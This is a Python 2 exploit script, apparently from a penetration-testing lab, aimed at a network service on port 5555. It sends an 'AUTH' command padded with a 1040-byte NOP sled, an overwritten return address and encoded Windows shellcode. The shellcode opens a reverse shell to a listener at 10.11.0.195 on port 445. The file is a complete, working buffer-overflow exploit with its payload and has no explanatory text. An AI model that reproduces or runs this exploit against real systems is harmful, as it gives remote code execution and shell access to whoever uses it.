#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

# x86 Windows shikata_ga_nai reverse shell payload
# lhost = 10.11.0.195
# lport = 445
# exitfunc = thread
# bad characters: \x00\x00

shellcode =  ""
shellcode += "\x41\x98\x42\x92\x2f\x99\xbb\x63\x1c\x16\xe6\xd9"
shellcode += "\xc8\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x52\x31\x5a"
shellcode += "\x12\x03\x5a\x12\x83\xa1\x18\xf4\x13\xd9\xc9\x7a"
shellcode += "\xdb\x21\x0a\x1b\x55\xc4\x3b\x1b\x01\x8d\x6c\xab"
shellcode += "\x41\xc3\x80\x40\x07\xf7\x13\x24\x80\xf8\x94\x83"
shellcode += "\xf6\x37\x24\xbf\xcb\x56\xa6\xc2\x1f\xb8\x97\x0c"
shellcode += "\x52\xb9\xd0\x71\x9f\xeb\x89\xfe\x32\x1b\xbd\x4b"
shellcode += "\x8f\x90\x8d\x5a\x97\x45\x45\x5c\xb6\xd8\xdd\x07"
shellcode += "\x18\xdb\x32\x3c\x11\xc3\x57\x79\xeb\x78\xa3\xf5"
shellcode += "\xea\xa8\xfd\xf6\x41\x95\x31\x05\x9b\xd2\xf6\xf6"
shellcode += "\xee\x2a\x05\x8a\xe8\xe9\x77\x50\x7c\xe9\xd0\x13"
shellcode += "\x26\xd5\xe1\xf0\xb1\x9e\xee\xbd\xb6\xf8\xf2\x40"
shellcode += "\x1a\x73\x0e\xc8\x9d\x53\x86\x8a\xb9\x77\xc2\x49"
shellcode += "\xa3\x2e\xae\x3c\xdc\x30\x11\xe0\x78\x3b\xbc\xf5"
shellcode += "\xf0\x66\xa9\x3a\x39\x98\x29\x55\x4a\xeb\x1b\xfa"
shellcode += "\xe0\x63\x10\x73\x2f\x74\x57\xae\x97\xea\xa6\x51"
shellcode += "\xe8\x23\x6d\x05\xb8\x5b\x44\x26\x53\x9b\x69\xf3"
shellcode += "\xf4\xcb\xc5\xac\xb4\xbb\xa5\x1c\x5d\xd1\x29\x42"
shellcode += "\x7d\xda\xe3\xeb\x14\x21\x64\x1e\xe2\x29\xb7\x76"
shellcode += "\xf6\x29\x36\x3c\x7f\xcf\x52\x52\xd6\x58\xcb\xcb"
shellcode += "\x73\x12\x6a\x13\xae\x5f\xac\x9f\x5d\xa0\x63\x68"
shellcode += "\x2b\xb2\x14\x98\x66\xe8\xb3\xa7\x5c\x84\x58\x35"
shellcode += "\x3b\x54\x16\x26\x94\x03\x7f\x98\xed\xc1\x6d\x83"
shellcode += "\x47\xf7\x6f\x55\xaf\xb3\xab\xa6\x2e\x3a\x39\x92"
shellcode += "\x14\x2c\x87\x1b\x11\x18\x57\x4a\xcf\xf6\x11\x24"
shellcode += "\xa1\xa0\xcb\x9b\x6b\x24\x8d\xd7\xab\x32\x92\x3d"
shellcode += "\x5a\xda\x23\xe8\x1b\xe5\x8c\x7c\xac\x9e\xf0\x1c"
shellcode += "\x53\x75\xb1\x3d\xb6\x5f\xcc\xd5\x6f\x0a\x6d\xb8"
shellcode += "\x8f\xe1\xb2\xc5\x13\x03\x4b\x32\x0b\x66\x4e\x7e"
shellcode += "\x8b\x9b\x22\xef\x7e\x9b\x91\x10\xab"


# Address: 0x65D11D71
# EIP: 1040
# ESP: 1046
req1 = "AUTH " + "\x90" * 1040 + "\x71\x1D\xD1\x65" + shellcode
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
